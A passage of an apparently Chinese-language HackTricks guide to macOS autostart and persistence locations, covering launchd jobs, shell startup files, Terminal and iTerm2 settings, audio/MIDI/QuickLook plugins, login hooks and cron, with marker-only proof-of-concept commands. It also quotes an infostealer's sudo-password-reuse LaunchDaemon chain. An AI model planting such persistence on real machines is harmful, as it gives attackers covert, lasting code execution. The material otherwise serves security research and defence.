# macOS 自动启动

{{#include ../banners/hacktricks-training.md}}

本节主要基于博客系列 [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)。其目标是找出可能因写入文件而导致后续代码执行的位置、触发执行的事件，以及所需权限。某个位置存在，并不能证明对应机制已启用。以下本地检查是在 macOS 26.5.2（2026 年 10 月 5 日）上进行的；这些检查不能说明所有 macOS 版本上的行为。

> [!NOTE]
> “写入触发”并不总意味着“写入后立即运行”。有些位置只会在登录时、特定应用启动时，或用户执行某项操作时读取。向已配置任务中的可写载荷写入内容，也不同于有权限注册新任务。依赖某种技术之前，请先在一次性账户或 VM 中进行测试。

## 绕过 Sandbox

> [!TIP]
> 在这里，你可以找到适用于 **绕过 sandbox** 的自动启动位置：只需**将内容写入文件**并**等待**某个非常**常见的**操作、特定的**时间**，或通常可以在 sandbox 内执行的**操作**，即可执行内容，且无需 root 权限。

### Launchd

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/Library/LaunchAgents`**
  - **触发条件**：用户登录（或显式注册）
  - 需要 root 权限
- **`/Library/LaunchDaemons`**
  - **触发条件**：系统启动（或显式注册）
  - 需要 root 权限
- **`/System/Library/LaunchAgents`**
  - **触发条件**：用户登录；受保护的 Apple 系统位置
- **`/System/Library/LaunchDaemons`**
  - **触发条件**：系统启动；受保护的 Apple 系统位置
- **`~/Library/LaunchAgents`**
  - **触发条件**：重新登录

`launchd` 不会扫描 `~/Library/LaunchDaemons` 位置。每用户任务应放在 `~/Library/LaunchAgents` 中；系统守护进程目录则是 `/Library/LaunchDaemons`。[Apple 的 launchd 启动指南](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)记录了这些扫描位置。

> [!TIP]
> 一个有趣的事实是，**`launchd`** 在 Mach-o 区段 `__Text.__config` 中嵌入了一个属性列表，其中包含 launchd 必须启动的其他知名服务。此外，这些服务可以包含 `RequireSuccess`、`RequireRun` 和 `RebootOnSuccess`，表示它们必须运行并成功完成。
>
> 当然，由于代码签名，它无法被修改。

#### 描述与利用

**`launchd`** 是 OX S 内核在启动时执行的**第一个****进程**，也是关机时最后结束的进程。它的 **PID** 应始终为 **1**。该进程会读取并执行以下位置中 **ASEP** **plist** 指定的配置：

- `/Library/LaunchAgents`：由管理员安装的每用户代理
- `/Library/LaunchDaemons`：由管理员安装的系统级守护进程
- `/System/Library/LaunchAgents`：由 Apple 提供的每用户代理。
- `/System/Library/LaunchDaemons`：由 Apple 提供的系统级守护进程。

用户登录时，`launchd` 会以该用户的权限加载其 `~/Library/LaunchAgents` 中的 plist。任务会根据其键值启动；仅加载 plist 并不意味着进程会立即执行。

**代理与守护进程的主要区别在于：代理在用户登录时加载，而守护进程在系统启动时加载**（因为像 ssh 这样的服务需要在用户访问系统之前启动）。此外，代理可以使用 GUI，而守护进程需要在后台运行。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

每个 `ProgramArguments` 元素都是一个独立参数；`launchd` 不会将单个字符串解析为 shell 命令。无需加载即可对上面的修正示例进行语法检查：`plutil -lint /path/to/example.plist`。请参阅本地 `man launchd.plist` 条目中的 `ProgramArguments`、`RunAtLoad` 和 `KeepAlive`。

#### 现有 job 中的文件事件触发器

**已加载**的 agent 或 daemon 可以使用 `WatchPaths`，在指定路径发生变化时启动。目录非空时，`QueueDirectories` 会启动 job；挂载卷时，`StartOnMount` 会启动 job。[Apple 的 launchd 指南](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9)包含 `WatchPaths` 和 `QueueDirectories` 的示例。向受监视文件写入内容会触发**已配置的 job**；只有当写入者还能够控制该 job 的可执行文件、脚本或该 job 会解释的数据时，才会获得任意代码执行能力。仅仅在未扫描或未注册的位置写入新的 plist，并不会加载它。

这个会自行清理的 PoC 会注册一个名称唯一的**临时用户 agent**，只修改自身监视的文件，然后移除该 agent。它已在 macOS 26.5.2 上成功运行，无需注销或重启：

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

本地运行输出了 `watch fired: True`，且 `bootout` 成功。这里仅在隔离的 PoC 中使用 `launchctl bootstrap`；对于已经加载的 job，则不需要使用它。要安全地评估现有 job，请读取其 plist 和解析后的 `ProgramArguments` 路径，然后检查相关可执行文件或被解释执行的文件是否可写，不要对其进行修改。

有些情况下，**agent 需要在用户登录前执行**，这类 agent 称为 **PreLoginAgents**。例如，可用它们在登录时提供辅助技术。它们也可以在 `/Library/LaunchAgents` 中找到（参见[**此处**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)的示例）。

> [!TIP]
> 新的 Daemon 或 Agent 配置文件将在**下次重启后或使用** `launchctl load <target.plist>` **时加载**。也可以使用 `launchctl -F <file>` 加载**没有该扩展名的 .plist 文件**（但这些 plist 文件在重启后不会自动加载）。\
> 也可以使用 `launchctl unload <target.plist>` **卸载**（它指向的进程将被终止），
>
> 要**确保**没有任何内容（例如覆盖项）**阻止** **Agent** 或 **Daemon** **运行**，请运行：`sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

列出当前用户加载的所有 agents 和 daemons：

```bash
launchctl list
```

#### 恶意 LaunchDaemon 链示例（密码重用）

近期有一款 macOS 信息窃取程序重用了**捕获到的 sudo 密码**，以创建 user agent 和 root LaunchDaemon：<sup>[[1]](#references)</sup>

- 将 agent 循环写入 `~/.agent` 并赋予其可执行权限。
- 在 `/tmp/starter` 生成一个指向该 agent 的 plist。
- 使用 `sudo -S` 重用窃取的密码，将其复制到 `/Library/LaunchDaemons/com.finder.helper.plist`，设置 `root:wheel`，并使用 `launchctl load` 加载。
- 通过 `nohup ~/.agent >/dev/null 2>&1 &` 静默启动 agent，使其输出脱离终端。

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> 放置在 `/Library/LaunchDaemons` 中的 daemon plist 不会因为将其所有者设为普通用户而变得安全。`launchd` 要求系统作业具有适当的所有权和权限，否则可能会拒绝不安全的 plist。由 root 拥有的 daemon 通常以 root 身份运行，除非其配置指定了其他账户。请检查作业的 `UserName`、`GroupName`、所有权和 `launchctl` 诊断信息；不要仅凭 plist 所有者的名称推断执行身份。

#### 关于 launchd 的更多信息

**`launchd`** 是从 **kernel** 启动的第一个用户模式进程。它必须**成功**启动，并且**不能退出或崩溃**。它甚至受到保护，不受某些**终止信号**影响。

`launchd` 首先会做的事情之一，就是**启动**所有 **daemons**，例如：

- 基于执行时间的 **Timer daemons**：
  - 在 macOS 26.5.2 中，`com.apple.atrun.plist` 会以 `StartInterval = 30` 秒的间隔调用 `/usr/libexec/atrun`；其实际启用状态可能与 plist 的 `Disabled` 键不同，因为 launchd 会单独保存覆盖设置。
  - 当 `/usr/lib/cron/tabs` 中包含作业时，`com.vix.cron.plist` 会调用 `/usr/sbin/cron`。`com.apple.systemstats.daily` 是另一个定时服务，并非 cron daemon。
- **Network daemons**，例如：
  - `org.cups.cups-lpd`：监听 TCP（`SockType: stream`），`SockServiceName: printer`
    - SockServiceName 必须是端口，或 `/etc/services` 中定义的服务
  - `com.apple.xscertd.plist`：监听 TCP 端口 1640
- 当指定路径发生变化时执行的 **Path daemons**：
  - `com.apple.postfix.master`：监视路径 `/etc/postfix/aliases`
- **IOKit notifications daemons**：
  - `com.apple.xartstorageremoted`：`"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port：**
  - `com.apple.xscertd-helper.plist`：其 `MachServices` 条目指定了名称 `com.apple.xscertd.helper`
- **UserEventAgent：**
  - 这与前一种情况不同。它会让 launchd 响应特定事件来启动应用。不过在这种情况下，涉及的主二进制文件不是 `launchd`，而是 `/usr/libexec/UserEventAgent`。它会从受 SIP 限制的目录 /System/Library/UserEventPlugins/ 加载插件；每个插件都会在 `XPCEventModuleInitializer` 键中指定其初始化器；对于较旧的插件，则在其 `Info.plist` 的 `CFPluginFactories` 字典中，通过键 `FB86416D-6164-2070-726F-70735C216EC0` 指定初始化器。

### shell 启动文件

Writeup：[https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup（xterm）：[https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC Bypass：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要找到一个具有 TCC Bypass 的应用，并且该应用会执行加载这些文件的 shell

#### 位置

- **`~/.zshenv`**（或较新的编译版本 **`~/.zshenv.zwc`**）
  - **触发条件**：任何常规 zsh 调用，包括非交互式 `zsh -c`；`zsh -f` 会跳过用户启动文件。
- **`~/.zshrc`**
  - **触发条件**：启动交互式 zsh。
- **`~/.zprofile`、`~/.zlogin`**
  - **触发条件**：启动登录 zsh；它们分别在 `.zshrc` 之前和之后读取。
- **`/etc/zshenv`、`/etc/zprofile`、`/etc/zshrc`、`/etc/zlogin`**
  - **触发条件**：使用 zsh 打开终端
  - 需要 root 权限
- **`~/.zlogout`**
  - **触发条件**：登录 zsh 正常退出时触发，并非每次终端或 shell 退出时都会触发。
- **`/etc/zlogout`**
  - **触发条件**：使用 zsh 退出终端
  - 需要 root 权限
- 可能还有更多内容，参见：**`man zsh`**
- **`~/.bashrc`**
  - **触发条件**：启动交互式**非登录** Bash。交互式登录 Bash 只有在登录文件明确 source 该文件时才会读取它。
- **`~/.bash_profile`、`~/.bash_login`、`~/.profile`**
  - **触发条件**：启动登录 Bash；按此顺序执行第一个可读文件。如果前两个文件中任意一个存在，就会跳过 `~/.profile`。
- **`/etc/profile`**
  - **触发条件**：启动登录 Bash；修改它需要 root 权限。
- **`~/.tcshrc`**，或者在该文件不存在时使用 **`~/.cshrc`**
  - **触发条件**：启动 `tcsh`，包括在这台 Mac 上运行非交互式 `tcsh -c`。用户必须实际调用 `tcsh`；它不是 macOS 的默认 shell。
- **`~/.login`**
  - **触发条件**：启动登录 `tcsh`，在其 rc 文件之后读取。
- `~/.xinitrc`、`~/.xserverrc`、`/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **触发条件**：预计会在 xterm 启动时触发，但它**未安装**；即使安装后也会出现此错误：xterm：`DISPLAY is not set`<sup>[[3]](#references)</sup>

#### 描述与 Exploitation

启动 `zsh` 或 `bash` 等 shell 环境时，会运行**某些启动文件**。macOS 当前将 `/bin/zsh` 用作默认 shell。Terminal 或 SSH 是否启动登录 shell 或交互式 shell，取决于其配置；不要假设上述每个文件都会在每个会话中运行。虽然 macOS 也包含 `bash` 和 `sh`，但必须显式调用它们才能使用。<sup>[[2]](#references)</sup> [zsh 启动文件参考](https://zsh.sourceforge.io/Doc/Release/Files.html)说明了文件的读取顺序、`ZDOTDIR` 覆盖设置以及 `.zwc` 规则。

以下只读实验在 macOS 26.5.2 上使用了一个临时的 `ZDOTDIR`。它展示了读取了哪些用户文件；没有修改任何实际的 shell 启动文件：

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

观察到的顺序为 `-c`：`zshenv`；`-ic`：`zshenv zshrc`；`-lc`：`zshenv zprofile zlogin`；`-lic`：`zshenv zprofile zshrc zlogin zlogout`。`ZDOTDIR` 必须已经指向备用目录；仅在任意目录中写入文件是不够的。

[Bash 的启动文件参考](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)区分了登录 shell 和交互式 shell。在 macOS 26.5.2 测试机上，一个包含全部四个用户启动文件的隔离 `HOME` 得到以下结果：`bash -c` → 无；`bash -ic` → `.bashrc`；`bash -lc` 和 `bash -lic` → 仅 `.bash_profile`。移除 `.bash_profile` 后，登录 Bash 会读取 `.bash_login`；如果它也被移除，则会读取 `.profile`。`BASH_ENV` 可以让非交互式 Bash 读取指定文件，但调用进程必须已经设置该环境变量。登录 Bash 中显式执行 `exit` 也可能加载 `~/.bash_logout`。

本地的 `tcsh(1)` 手册记录了单独的启动顺序。使用临时 `HOME` 时，`/bin/tcsh -c :` 会读取 `.tcshrc`；如果 `.tcshrc` 不存在，则读取 `.cshrc`。临时登录 `tcsh` 会读取 `.tcshrc` 和 `.login`。这些检查只创建并移除了临时文件。

### 重新打开的应用程序

> [!CAUTION]
> 测试中，配置所述 exploitation 并注销再重新登录，甚至重启，都不会执行该应用程序。执行这些操作时，可能需要让该应用程序处于运行状态。

**Writeup**：[https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **触发条件**：重启时重新打开应用程序

#### 描述与 exploitation

所有需要重新打开的应用程序都位于 plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 中<sup>[[4]](#references)</sup>

因此，要让重新打开的应用程序启动你自己的应用程序，只需**将你的应用程序添加到列表中**。

可以通过列出该目录，或运行 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` 来查找 UUID。

要检查哪些应用程序将被重新打开，可以运行：

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

要**将应用添加到此列表**，可以使用：

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal 偏好设置

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC 绕过：[✅](https://emojipedia.org/check-mark-button)
  - Terminal 使用时拥有该用户的 FDA 权限

#### 位置

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **触发条件**：使用 Shell 设置中包含启动命令的配置文件，打开新的 Terminal 窗口或标签页

#### 描述与利用

**`~/Library/Preferences`** 中存储着用户各个应用程序的偏好设置。其中一些偏好设置可以包含用于**执行其他应用程序/脚本**的配置。<sup>[[5]](#references)</sup>

例如，Terminal 可以在启动时执行命令：

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

此配置会反映在文件 **`~/Library/Preferences/com.apple.Terminal.plist`** 中，如下所示：

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

如果相关配置文件中包含启动命令，且 Terminal 读取了该偏好设置，那么使用该配置文件创建的新会话就可以执行该命令。[Apple 当前的 Terminal 指南](https://support.apple.com/guide/terminal/trmlshll/mac)介绍了每个配置文件的 **Shell → Startup** 命令。仅打开 Terminal，而不使用该配置文件创建新会话，是不够的。以下偏好设置修改**未**在研究用 Mac 上执行。

你可以通过 cli 添加此项：

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- 用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC 绕过：[✅](https://emojipedia.org/check-mark-button)
  - 使用 Terminal 时，可获得用户授予的 FDA 权限

#### Location

- **任意位置**
  - **触发方式**：打开特定的 `.terminal`、`.command` 或 `.tool` 文件

#### Description & Exploitation

如果用户打开 **`.terminal`** 设置文件，Terminal 可以根据其配置文件创建会话；可执行的 **`.command`** 和 **`.tool`** 文件也可以在 Terminal 中打开。这是由明确的文件打开操作触发的，并非仅仅打开 Terminal 就会执行。继承的任何 TCC 访问权限取决于 Terminal 实际获准的权限以及尝试执行的操作。以下历史示例并未在研究用 Mac 上运行。

试试看：

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

你也可以使用 **`.command`**、**`.tool`** 扩展名，文件内容为常规 shell 脚本，它们也会由 Terminal 打开。

> [!CAUTION]
> 如果 Terminal 拥有 **Full Disk Access**，就能够完成该操作（请注意，执行的命令会显示在 Terminal 窗口中）。

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC bypass：[🟠](https://emojipedia.org/large-orange-circle)
  - 可能会获得一些额外的 TCC 访问权限

#### 位置

- **`/Library/Audio/Plug-Ins/HAL`**
  - 需要 root 权限
  - **触发条件**：Core Audio 服务器加载兼容的 HAL 设备插件；重启服务器可能会触发重新发现
- **`/Library/Audio/Plug-ins/Components`**
  - 需要 root 权限
  - **触发条件**：音频主机发现并实例化已安装的 Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **触发条件**：音频主机发现并实例化已安装的 Audio Unit
- **`/System/Library/Components`**
  - Apple 提供的系统保护位置
  - **触发条件**：音频主机实例化匹配的系统组件

#### 描述

根据之前的 writeup，可以**编译一些音频插件**并使其加载。<sup>[[6]](#references)[[7]](#references)</sup>

HAL 设备插件和 Audio Unit 使用不同的加载路径。[Apple 的 Audio Unit 托管指南](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html)指出，主机必须找到并实例化组件；仅将组件复制到扫描目录或重启 `coreaudiod`，并不能证明代码已执行。AUv2 插件在主机进程中运行，而[Apple 当前的 Audio Unit 指南](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments)指出，在 macOS 上，AUv3 默认在独立进程中运行。签名、sandbox 和库验证的限制取决于主机。研究用的 Mac 上未安装或执行任何音频插件。

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 你的代码会在 `MIDIServer` 进程中运行，不受应用的 sandbox 限制
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` 使用自己的 `seatbelt` sandbox 配置文件运行

#### 位置

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - 无需 root 权限（用户可写）
  - **触发条件**：`MIDIServer` 启动或重新启动。任何进程首次使用 CoreMIDI 时，它会按需启动（例如打开 *Audio MIDI Setup*、GarageBand、DAW，或访问使用 WebMIDI 的页面）
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - 需要 root 权限
  - **触发条件**：同上

#### 描述与利用

Apple 的 `MIDIServer`（`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`）会从 `Audio/MIDI Drivers` 目录加载 MIDI **驱动程序** bundle。该二进制文件由 Apple 签名，但带有 `com.apple.security.cs.disable-library-validation` entitlement，因此它会加载**未签名或由其他团队 ad-hoc 签名的** bundle，从而无需 root 即可在独立的 Apple 所有进程中执行代码。<sup>[[53]](#references)</sup>

已在 macOS 26 上验证（只读）：

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

驱动程序是一个导出 `MIDIDriverInterface` 工厂的标准 bundle；将 payload 放入工厂/constructor 中，可使其在 `MIDIServer` 枚举驱动程序时立即运行。构建后，将其放入 `~/Library/Audio/MIDI Drivers/Evil.plugin`，然后触发加载，无需注销或重启：

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook 插件

Writeup：[https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC 绕过：[🟠](https://emojipedia.org/large-orange-circle)
  - 你可能会获得一些额外的 TCC 访问权限

#### 位置

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 描述与利用

安装了支持该文件类型的 **插件** 后，**触发文件预览**即可执行 QuickLook 插件（在 Finder 中选中文件并按空格键）。<sup>[[8]](#references)</sup>

你可以编译自己的 QuickLook 插件，将它放在上述位置之一以加载，然后找到支持的文件并按空格键触发它。

这些路径对应旧版 `.qlgenerator` bundles；[Apple 的 Quick Look 架构指南](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html)介绍了搜索顺序和匹配的文件类型。当前的 Quick Look **app extensions** 与 app 一起打包，并采用不同的注册和执行规则。存在 generator 并不能证明它会被选中来处理该文件类型，也不能证明其代码会在 Finder 本身中运行。研究期间，我们根据文档和目录内容检查了旧版 generator 路径；研究用 Mac 上未安装或加载任何 generator。

### ~~登录/注销 Hooks~~

> [!CAUTION]
> 这对我不起作用，无论是用户的 LoginHook，还是 root 的 LogoutHook 都不行

**Writeup**：[https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 你需要能够执行类似 `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` 的命令
  - `Lo`位于 `~/Library/Preferences/com.apple.loginwindow.plist`

它们已弃用，但仍可用于在用户登录时执行命令。<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

此设置存储在 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`中。

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

要删除它：

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

root 用户的条目存储在 **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> 这里列出了一些可用于 **sandbox bypass** 的启动位置：只需**将内容写入文件**，并**满足不太常见的条件**（例如安装了特定**程序**、用户执行了“少见”的操作，或处于特定环境），即可执行某些内容。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- 可用于 bypass sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要能够执行 `crontab` binary
  - 或者拥有 root 权限
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`**
  - 直接写入需要 root 权限。如果你能执行 `crontab <file>`，则不需要 root 权限
  - **触发条件**：已安装 crontab 中的计划任务。`at` 和 `periodic` 是下面介绍的独立机制。

#### Description & Exploitation

使用以下命令列出**当前用户**的 cron 任务：

```bash
crontab -l
```

系统 cron 守护进程的 launchd plist 中有一个 `QueueDirectories` 条目，指向 `/usr/lib/cron/tabs`；已安装的用户 crontab 都保存在此处。检查其他用户的 crontab 需要 root 权限：

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

在一次性账户中，可以使用 `crontab` 安装一条仅含标记的用户 cron 条目，并在观察后将其删除。运行 `crontab <file>` **会替换该账户现有的整个 crontab**，因此如果该账户并非一次性账户，请先保存并在之后恢复：<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

技术分析：[https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC bypass：[✅](https://emojipedia.org/check-mark-button)
  - iTerm2 曾获得 TCC 权限

#### 位置

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **触发条件**：在该文件夹中放置符合条件的 Python API 脚本并启动 iTerm2
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **触发条件**：启动 iTerm2；AppleScript 启动钩子另有说明
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **触发条件**：创建一个会话，其配置文件中的命令或初始文本会调用 payload

#### 说明与利用

